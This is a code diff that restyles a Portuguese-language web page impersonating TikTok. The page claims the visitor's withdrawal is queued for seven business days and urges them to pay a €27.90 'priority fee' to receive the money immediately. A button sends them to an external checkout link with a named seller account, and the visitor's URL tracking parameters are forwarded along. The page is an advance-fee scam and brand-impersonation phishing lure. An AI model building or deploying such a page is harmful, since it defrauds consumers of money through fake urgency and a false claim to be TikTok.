@@ -1,127 +1,70 @@
 <!DOCTYPE html>
-<html lang="pt-BR">
+<html lang="pt-PT">
 
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <meta name="robots" content="max-image-preview:large">
-  <title>Pagamento Urgente</title>
-  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap">
-
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Levantamento Imediato TikTok</title>
+    <link rel="stylesheet" href="/css/upsell-premium.css">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700;800;900&display=swap" rel="stylesheet">
 </head>
 
-<body style="
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-      font-family: 'Poppins', sans-serif;
-      background: linear-gradient(135deg, #FE2C55, #FF4D79);
-      color: #333;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      min-height: 100vh;
-      text-align: center;
-    ">
-  <div style="
-        width: 90%;
-        max-width: 600px;
-        background: #ffffff;
-        padding: 20px;
-        border-radius: 12px;
-        box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
-        text-align: center;
-      ">
-    <div style="margin-bottom: 20px">
-      <img src="/logo.svg" alt="TikTok Logo" style="width: 100px">
+<body>
+    <div class="premium-container">
+        <div class="logo-container">
+            <img src="/logo.svg" alt="TikTok" class="logo">
+        </div>
+
+        <div class="badge" style="background: #04c500; color: #fff;">Pedido Recebido</div>
+
+        <h1 class="title">Levantamento <span style="color: #04c500;">Solicitado</span></h1>
+
+        <div class="description">
+            O seu levantamento está na fila de processamento bancário padrão.
+        </div>
+
+        <div class="amount-box" style="border-color: #d9534f; background: rgba(217, 83, 79, 0.05);">
+            <div class="amount-label">PRAZO DE ENTREGA ESTIMADO</div>
+            <div class="amount-value" style="color: #d9534f; font-size: 32px;">7 DIAS ÚTEIS</div>
+        </div>
+
+        <div class="description">
+            Quer <strong>EVITAR A ESPERA</strong>? Ative a Prioridade Máxima e receba o seu dinheiro <span class="highlight-cyan">IMEDIATAMENTE</span> na sua conta.
+        </div>
+
+        <button onclick="redirectToPayment()" class="cta-button pulse">
+            <span>RECEBER AGORA (PIX/MB WAY)</span>
+            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><line x1="5" y1="12" x2="19" y2="12"></line><polyline points="12 5 19 12 12 19"></polyline></svg>
+        </button>
+
+        <p class="footer-text">
+            © 2026 TikTok Portugal. Taxa única de prioridade €27,90.
+        </p>
     </div>
-    <h2 style="font-size: 2rem; color: #04c500; margin-bottom: 15px">
-      Levantamento Solicitado com Sucesso!
-    </h2>
-    <p style="font-size: 1.1rem; color: #555; margin-bottom: 20px">
-      O seu levantamento será processado num prazo de até
-      <span style="color: #d9534f; font-weight: 700">7 DIAS ÚTEIS</span>.
-    </p>
-    <p style="font-size: 1.1rem; color: #555; margin-bottom: 20px">
-      Quer <strong>EVITAR A ESPERA</strong>? Antecipe e receba
-      <span style="color: #d9534f; font-weight: 700">IMEDIATAMENTE</span>
-      pagando apenas uma taxa de prioridade de €27,90!
-    </p>
-    <p style="
-          font-size: 1.2rem;
-          color: #ff0000;
-          font-weight: bold;
-          margin-top: 20px;
-        ">
-      Atenção: Oferta válida por tempo limitado!
-    </p>
-    <button onclick="redirectToPayment()" style="
-          background: #FE2C55;
-          color: #fff;
-          border: none;
-          padding: 15px 20px;
-          font-size: 1rem;
-          font-weight: 700;
-          border-radius: 25px;
-          cursor: pointer;
-          transition: transform 0.3s ease, background 0.3s ease;
-          text-decoration: none;
-          display: inline-block;
-          animation: pulse 1s infinite;
-        ">
-      RECEBER AGORA
-    </button>
-    <style>
-      @keyframes pulse {
 
-        0%,
-        100% {
-          transform: scale(1);
+    <script>
+        function getUrlParams() {
+            const params = new URLSearchParams(window.location.search);
+            let paramsObject = {};
+            params.forEach((value, key) => {
+                paramsObject[key] = value;
+            });
+            return paramsObject;
         }
 
-        50% {
-          transform: scale(1.1);
+        function redirectToPayment() {
+            const params = new URLSearchParams(window.location.search);
+            const checkoutUrl = new URL('https://waymb.com/c?username=eduardotreonix&product=5');
+
+            params.forEach((value, key) => {
+                checkoutUrl.searchParams.set(key, value);
+            });
+
+            window.location.href = checkoutUrl.toString();
         }
-      }
-    </style>
-  </div>
-
-  <script>
-    // Função para capturar os parâmetros GET da URL atual
-    function getUrlParams() {
-      const params = new URLSearchParams(window.location.search);
-      let paramsObject = {};
-      params.forEach((value, key) => {
-        paramsObject[key] = value;
-      });
-      return paramsObject;
-    }
-
-    //reescrever redirects pra incluir parametros
-    function redirectWithParams(baseUrl) {
-      const params = getUrlParams();
-      const url = new URL(baseUrl, window.location);
-
-      Object.keys(params).forEach(key => {
-        url.searchParams.set(key, params[key]);
-      });
-
-      window.location.href = url.toString();
-    }
-
-    function redirectToPayment() {
-      const params = new URLSearchParams(window.location.search);
-      const checkoutUrl = new URL('https://waymb.com/c?username=eduardotreonix&product=5');
-
-      params.forEach((value, key) => {
-        checkoutUrl.searchParams.set(key, value);
-      });
-
-      window.location.href = checkoutUrl.toString();
-    }
-  </script>
-
-
+    </script>
 </body>
 
 </html>
